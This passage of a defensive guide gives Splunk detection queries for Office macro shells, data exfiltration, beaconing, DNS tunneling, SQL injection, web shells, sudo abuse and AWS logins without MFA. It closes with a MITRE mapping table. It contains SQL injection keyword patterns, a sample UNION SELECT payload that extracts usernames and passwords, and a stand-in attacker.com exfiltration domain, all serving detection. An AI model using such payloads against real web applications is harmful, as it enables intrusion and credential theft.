##### 🕵️ Investigation Tips

1. Identify `SubjectUserName` to determine who cleared the log.
2. Investigate all endpoint actions on `ComputerName` prior to log deletion.

##### 🛡️ Recommended Response

* Immediately isolate the system; manual log deletion heavily indicates post-compromise anti-forensics.

---

#### 13. Office Application Spawning Command Shell (Phishing Macro)

##### 🎯 What It Detects

Microsoft Office applications (Word, Excel, PowerPoint) launching command shells (`cmd.exe`, `powershell.exe`, `wscript.exe`).

##### 🧠 Attack Concept

Malicious email documents execute embedded VBA macros that spawn system shells to fetch secondary payloads.

* **MITRE ATT&CK:** T1204.002 — User Execution: Malicious File

##### 📥 Required Log Source

* **Log Source:** Sysmon / Windows Event Code 4688
* **Example Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
* **Key Fields:** `EventCode` (1), `ParentImage`, `Image`, `CommandLine`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| search (ParentImage="*winword.exe" OR ParentImage="*excel.exe" OR ParentImage="*powerpnt.exe") AND (Image="*cmd.exe" OR Image="*powershell.exe" OR Image="*wscript.exe" OR Image="*mshta.exe")
| table _time, Computer, User, ParentImage, Image, CommandLine

```

##### 🔍 SPL Command Breakdown

* `ParentImage="*winword.exe"...`: Filters for Microsoft Office applications acting as parent processes.
* `Image="*cmd.exe"...`: Flags child processes commonly used to run shell scripts.

##### 📊 Example Result

| Computer | User | ParentImage | Image | CommandLine |
| --- | --- | --- | --- | --- |
| FIN-PC01 | abrown | excel.exe | powershell.exe | powershell.exe -w hidden -c ... |

##### 🚨 Why This Is Suspicious

Office applications have no legitimate operational reason to launch interactive command prompts or PowerShell.

##### ⚙️ SOC Tuning

Filter out specific business-approved macro-enabled Excel workbooks that call internal scripts.

##### 🕵️ Investigation Tips

1. Inspect `CommandLine` to identify the script payload executed by the macro.
2. Retrieve the original email attachment from email security gateway logs.

##### 🛡️ Recommended Response

* Isolate host, delete the malicious document, and block sender address on email gateway.

---

### 🌐 Network Attacks & Exfiltration

#### 14. Large Outbound Data Transfer (Exfiltration Detection)

##### 🎯 What It Detects

An internal host transferring unusually high volumes of outbound data to an external remote IP within a short timeframe.

##### 🧠 Attack Concept

Adversaries stage and exfiltrate sensitive corporate data to external command-and-control servers or cloud storage providers.

* **MITRE ATT&CK:** T1048 — Exfiltration Over Alternative Protocol

##### 📥 Required Log Source

* **Log Source:** Firewall Logs / Network Proxy / Zeek Conn Logs
* **Example Sourcetype:** `pan:traffic`, `zeek:conn`
* **Key Fields:** `src_ip`, `dest_ip`, `bytes_out`, `action`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX (sourcetype="pan:traffic" OR sourcetype="zeek:conn") action="allowed"
| stats sum(bytes_out) as total_bytes_out by src_ip, dest_ip
| eval MB_out = round(total_bytes_out / 1024 / 1024, 2)
| where MB_out >= 500
| sort - MB_out

```

##### 🔍 SPL Command Breakdown

* `stats sum(bytes_out) as total_bytes_out ...`: Sums total bytes sent from each source IP to destination IP.
* `eval MB_out = ...`: Converts raw byte count into Megabytes for easy interpretation.
* `where MB_out >= 500`: Isolates single destination transfers exceeding 500 MB.

##### 📊 Example Result

| src_ip | dest_ip | MB_out |
| --- | --- | --- |
| 10.0.2.45 | 45.33.21.10 | 2450.75 |

##### 🚨 Why This Is Suspicious

Unusual outbound data spikes indicate potential mass exfiltration of sensitive internal databases or files.

##### ⚙️ SOC Tuning

Exclude legitimate offsite backup systems, cloud storage services (e.g., OneDrive, Box), and software updates.

##### 🕵️ Investigation Tips

1. Check destination IP ownership via WHOIS lookup.
2. Determine which local process generated the high outbound traffic volume using endpoint telemetry.

##### 🛡️ Recommended Response

* Block destination IP at the perimeter firewall.
* Isolate internal host to stop ongoing data transfer.

---

#### 15. Network Beaconing Detection

##### 🎯 What It Detects

Regular, periodic network connections between an internal host and external IP occurring at fixed time intervals.

##### 🧠 Attack Concept

Command-and-Control (C2) agents check in with adversary servers at regular intervals (beacons) to receive instructions.

* **MITRE ATT&CK:** T1071 — Application Layer Protocol

##### 📥 Required Log Source

* **Log Source:** Network Firewall / Proxy Logs / Sysmon Event Code 3
* **Example Sourcetype:** `pan:traffic`, `zeek:conn`
* **Key Fields:** `src_ip`, `dest_ip`, `_time`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="pan:traffic" action="allowed"
| sort 0 src_ip, dest_ip, _time
| streamstats current=f last(_time) as prev_time by src_ip, dest_ip
| eval time_gap = _time - prev_time
| stats count, stdev(time_gap) as gap_stddev, avg(time_gap) as gap_avg by src_ip, dest_ip
| where count >= 20 AND gap_stddev < 5
| sort - count

```

##### 🔍 SPL Command Breakdown

* `streamstats current=f last(_time) as prev_time ...`: Computes time elapsed between consecutive connections.
* `stdev(time_gap) as gap_stddev`: Calculates standard deviation of intervals. Low standard deviation indicates regular timing (beaconing).
* `where count >= 20 AND gap_stddev < 5`: Retains traffic streams with 20+ connections showing almost zero interval variance.

##### 📊 Example Result

| src_ip | dest_ip | count | gap_stddev | gap_avg |
| --- | --- | --- | --- | --- |
| 10.0.1.88 | 192.0.2.14 | 140 | 0.82 | 60.1 |

##### 🚨 Why This Is Suspicious

Automated C2 malware calls home on strict schedules (e.g., every 60 seconds), unlike human web browsing.

##### ⚙️ SOC Tuning

Filter out legitimate NTP time servers, security telemetry agents, and RSS feed updates.

##### 🕵️ Investigation Tips

1. Check external domain reputation associated with `dest_ip`.
2. Inspect host process logs to trace which application initiated the periodic connections.

##### 🛡️ Recommended Response

* Terminate initiating process on the endpoint and block `dest_ip` at firewall.

---

### 🧬 DNS Attacks

#### 16. DNS Tunneling & Exfiltration Detection

##### 🎯 What It Detects

An abnormally high volume of DNS queries containing unusually long query strings or high entropy targeted at a specific domain.

##### 🧠 Attack Concept

Adversaries encode stolen data or C2 communications into subdomains of DNS requests (e.g., `exfil-data-block.attacker.com`) to bypass firewalls.

* **MITRE ATT&CK:** T1071.004 — Application Layer Protocol: DNS

##### 📥 Required Log Source

* **Log Source:** DNS Server Logs / Zeek DNS / Splunk Stream
* **Example Sourcetype:** `WinDNS`, `zeek:dns`, `stream:dns`
* **Key Fields:** `src_ip`, `query`, `record_type`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX (sourcetype="zeek:dns" OR sourcetype="WinDNS")
| eval query_len = len(query)
| where query_len > 50
| stats count, avg(query_len) as avg_len, values(query) as sample_queries by src_ip
| where count > 100
| sort - count

```

##### 🔍 SPL Command Breakdown

* `eval query_len = len(query)`: Measures length of requested domain names.
* `where query_len > 50`: Filters for abnormally long DNS queries.
* `where count > 100`: Isolates hosts generating high volumes of long DNS requests.

##### 📊 Example Result

| src_ip | count | avg_len | sample_queries |
| --- | --- | --- | --- |
| 10.0.3.12 | 450 | 78.5 | `a8f9c2d1e.data.attacker.com`, `b9x1z2k3m.data.attacker.com` |

##### 🚨 Why This Is Suspicious

Standard web queries look up short domains (`google.com`). Encoded data payloads pushed through subdomains create long, unique DNS lookups.

##### ⚙️ SOC Tuning

Filter out security vendors and antivirus software that send file hashes via DNS lookups (e.g., Sophos, Trend Micro).

##### 🕵️ Investigation Tips

1. Analyze `sample_queries` to see if subdomains decode to Base64 or Hex strings.
2. Check top-level domain ownership.

##### 🛡️ Recommended Response

* Block parent domain on internal DNS resolvers and isolate host.

---

### 🕸️ Web Attacks

#### 17. SQL Injection (SQLi) Attempt

##### 🎯 What It Detects

HTTP requests containing SQL syntax tokens (`UNION SELECT`, `OR 1=1`, `INFORMATION_SCHEMA`) aimed at web applications.

##### 🧠 Attack Concept

Attackers input malicious SQL fragments into web forms or URL parameters to manipulate backend database queries.

* **MITRE ATT&CK:** T1190 — Exploit Public-Facing Application

##### 📥 Required Log Source

* **Log Source:** Web Server Access Logs (Apache, Nginx, IIS) / WAF
* **Example Sourcetype:** `access_combined`, `iis`, `aws:waf`
* **Key Fields:** `src_ip`, `uri_path`, `uri_query`, `status`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX (sourcetype="access_combined" OR sourcetype="iis")
| eval full_request = lower(coalesce(uri_query, uri_path))
| search full_request="*union*select*" OR full_request="*or 1=1*" OR full_request="*information_schema*" OR full_request="*drop table*" OR full_request="*sleep(*"
| stats count, values(full_request) as payloads by src_ip, status

```

##### 🔍 SPL Command Breakdown

* `eval full_request = lower(...)`: Unifies and normalizes URL path and query parameters to lowercase.
* `search full_request="*union*select*"`: Filters for recognizable SQL syntax patterns.

##### 📊 Example Result

| src_ip | status | count | payloads |
| --- | --- | --- | --- |
| 198.51.100.4 | 200 | 8 | `/item.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users` |

##### 🚨 Why This Is Suspicious

Legitimate web traffic does not contain SQL database commands inside URL parameters.

##### ⚙️ SOC Tuning

Whitelist internal vulnerability scanners conducting authorized web application security assessments.

##### 🕵️ Investigation Tips

1. Check HTTP response `status` code (e.g., `200` indicates potential success; `403` indicates blocked).
2. Inspect web application server logs for database error output.

##### 🛡️ Recommended Response

* Block attacking IP at WAF level.
* Notify web application development team to patch vulnerable code input fields.

---

#### 18. Web Shell Execution & Commands

##### 🎯 What It Detects

Web server processes (e.g., `w3wp.exe`, `httpd`, `nginx`) spawning operating system command interpreters (`cmd.exe`, `bash`).

##### 🧠 Attack Concept

After uploading a malicious web shell file, adversaries issue HTTP requests to execute shell commands directly on the server.

* **MITRE ATT&CK:** T1505.003 — Server Software Component: Web Shell

##### 📥 Required Log Source

* **Log Source:** Endpoint Process Monitoring (Sysmon / Auditd)
* **Example Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`, `auditd`
* **Key Fields:** `ParentImage`, `Image`, `CommandLine`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX (ParentImage="*w3wp.exe" OR ParentImage="*httpd*" OR ParentImage="*nginx*" OR ParentImage="*tomcat*") AND (Image="*cmd.exe" OR Image="*powershell.exe" OR Image="*bash" OR Image="*sh")
| table _time, host, ParentImage, Image, CommandLine, User

```

##### 🔍 SPL Command Breakdown

* `ParentImage="*w3wp.exe"...`: Filters for web server master engines.
* `Image="*cmd.exe"...`: Detects command shell child processes launched directly by the web server service.

##### 📊 Example Result

| host | ParentImage | Image | CommandLine |
| --- | --- | --- | --- |
| WEB-01 | w3wp.exe | cmd.exe | cmd.exe /c whoami |

##### 🚨 Why This Is Suspicious

Web applications process web code internally; they should never launch administrative system shells directly.

##### ⚙️ SOC Tuning

Exclude specific web applications designed explicitly to run server management commands (if verified and isolated).

##### 🕵️ Investigation Tips

1. Review web server access logs to pinpoint the exact uploaded `.aspx` or `.php` file requested right before shell invocation.
2. Search for newly modified files inside web server root folders (`C:\inetpub\wwwroot` or `/var/www/html`).

##### 🛡️ Recommended Response

* Isolate web server.
* Remove web shell file from disk and restart web services.

---

### 🐧 Linux Security

#### 19. Privilege Escalation via Unauthorized Sudo / Root Access

##### 🎯 What It Detects

Failed privilege escalation attempts or unauthorized users executing commands as `root` via `sudo`.

##### 🧠 Attack Concept

Adversaries leverage compromised user credentials or exploits to elevate privileges to `root` on Linux systems.

* **MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching

##### 📥 Required Log Source

* **Log Source:** Linux Auth Log / Auditd
* **Example Sourcetype:** `linux_secure`, `syslog`
* **Key Fields:** `user`, `command`, `app`, `src_ip`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="linux_secure" ("NOT in sudoers" OR "COMMAND=")
| eval status = if(match(_raw, "NOT in sudoers"), "Unauthorized_Attempt", "Executed")
| table _time, host, user, status, _raw

```

##### 🔍 SPL Command Breakdown

* `sourcetype="linux_secure"`: Target Linux authentication log file.
* `eval status = if(...)`: Differentiates between rejected unauthorized `sudo` executions and valid ones.

##### 📊 Example Result

| host | user | status | _raw |
| --- | --- | --- | --- |
| LIN-SRV01 | guest_user | Unauthorized_Attempt | guest_user : user NOT in sudoers ; TTY=pts/0 ; COMMAND=/bin/su |

##### 🚨 Why This Is Suspicious

Unprivileged accounts attempting to invoke `sudo` signals active internal discovery or privilege escalation attempts.

##### ⚙️ SOC Tuning

Filter out standard administrative users listed in corporate sudoers policy files.

##### Describe Investigation Steps

1. Review command history for `user` on `host`.
2. Inspect `/etc/sudoers` configuration for recent unauthorized modifications.

##### 🛡️ Recommended Response

* Lock compromised user account and review `/etc/sudoers` integrity.

---

### ☁️ Cloud & AWS Security

#### 20. AWS Console Login Without Multi-Factor Authentication (MFA)

##### 🎯 What It Detects

Successful AWS Management Console logins completed without triggering Multi-Factor Authentication.

##### 🧠 Attack Concept

Attackers leverage leaked AWS access keys or compromised passwords where MFA protection was not enforced.

* **MITRE ATT&CK:** T1078.004 — Valid Accounts: Cloud Accounts

##### 📥 Required Log Source

* **Log Source:** AWS CloudTrail Logs
* **Example Sourcetype:** `aws:cloudtrail`
* **Key Fields:** `eventName` (ConsoleLogin), `additionalEventData.MFAUsed`, `userIdentity.arn`, `sourceIPAddress`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="aws:cloudtrail" eventName="ConsoleLogin" responseElements.ConsoleLogin="Success"
| spath path=additionalEventData.MFAUsed output=mfa_used
| where mfa_used="No" OR isnull(mfa_used)
| table _time, userIdentity.arn, sourceIPAddress, userAgent, mfa_used

```

##### 🔍 SPL Command Breakdown

* `eventName="ConsoleLogin"`: Filters for AWS web management portal login events.
* `spath path=... output=mfa_used`: Extracts JSON tag indicating whether MFA was verified.
* `where mfa_used="No"`: Isolates successful logins lacking MFA validation.

##### 📊 Example Result

| userIdentity.arn | sourceIPAddress | mfa_used |
| --- | --- | --- |
| arn:aws:iam::123456789012:user/admin_user | 203.0.113.19 | No |

##### 🚨 Why This Is Suspicious

Cloud management console access grants immense infrastructure control; accessing it without MFA creates critical security risk.

##### ⚙️ SOC Tuning

Filter out automated SSO federated identities (e.g., SAML, AWS IAM Identity Center) where MFA is handled by the primary identity provider.

##### 🕵️ Investigation Tips

1. Verify if the account policy mandates MFA enforcement.
2. Review CloudTrail logs for actions executed by `userIdentity.arn` post-login.

##### 🛡️ Recommended Response

* Enforce immediate MFA binding on IAM user and invalidate active console sessions.

---

## 🗺️ Comprehensive MITRE ATT&CK Mapping Table

| Detection Name | MITRE ATT&CK Technique | ID | Phase | Log Source |
| --- | --- | --- | --- | --- |
| **Account Brute-Force** | Password Guessing | `T1110.001` | Credential Access | Windows Security / Linux Secure |
| **Password Spraying** | Password Spraying | `T1110.003` | Credential Access | Azure AD / Okta Logs |
| **Failed -> Success Login** | Brute Force | `T1110` | Credential Access | Windows Security Logs |
| **New IP Login** | Valid Accounts | `T1078` | Initial Access | Cloud IdP Logs |
| **Impossible Travel** | Valid Accounts | `T1078` | Initial Access | Cloud IdP Logs |
| **Kerberoasting** | Steal Kerberos Tickets | `T1558.003` | Credential Access | AD Domain Controller |
| **Local Account Creation** | Create Account | `T1136.001` | Persistence | Windows Security Logs |
| **Privileged Group Addition** | Account Manipulation | `T1098` | Persistence | Windows Security Logs |
| **Windows Service Creation** | System Process Service | `T1543.003` | Persistence | Windows System Logs |
| **Encoded PowerShell** | Command Interpreter | `T1059.001` | Execution | Sysmon / Event 4688 |
| **Unmanaged PowerShell** | PowerShell Execution | `T1059.001` | Execution | PowerShell Operational |
| **Security Log Cleared** | Indicator Removal | `T1070.001` | Defense Evasion | Windows Security Logs |
| **Office Shell Spawn** | Malicious File Execution | `T1204.002` | Execution | Sysmon Event 1 |
| **Large Data Transfer** | Exfiltration Alt Protocol | `T1048` | Exfiltration | Firewall / Proxy Logs |
| **Network Beaconing** | Application Layer C2 | `T1071` | Command and Control | Firewall / Proxy Logs |
| **DNS Tunneling** | DNS C2 Protocol | `T1071.004` | Command and Control | DNS Server / Zeek Logs |
| **SQL Injection** | Exploit Web Application | `T1190` | Initial Access | Web Server Access / WAF |
| **Web Shell Execution** | Web Shell Component | `T1505.003` | Persistence | Endpoint Process Monitor |
| **Linux Sudo Abuse** | Abuse Elevation Control | `T1548.003` | Privilege Escalation | Linux Auth Logs / Auditd |
| **AWS Login No MFA** | Valid Cloud Accounts | `T1078.004` | Initial Access | AWS CloudTrail Logs |

---



## ⚡ Quick Revision Table

| Goal | Primary Command | Example |
| --- | --- | --- |
| **Count events by field** | `stats count by <field>` | `... | stats count by src_ip` |
| **Count distinct targets** | `stats dc(<field>)` | `... | stats dc(user) by src_ip` |
| **Calculate running metrics** | `streamstats` | `... | streamstats last(_time) as prev by user` |
| **Normalize mismatched fields** | `eval coalesce()` | `... | eval user=coalesce(user, TargetUserName)` |
| **Extract custom regex pattern** | `rex field=_raw` | `... | rex field=_raw "User=(?<usr>\w+)"` |
| **Filter statistical outputs** | `where` | `... | where count > 10` |
| **Format summary tables** | `table` | `... | table _time, user, src_ip, action` |
| **Set numeric time boundaries** | `bin` / `bucket` | `... | bin _time span=1h` |
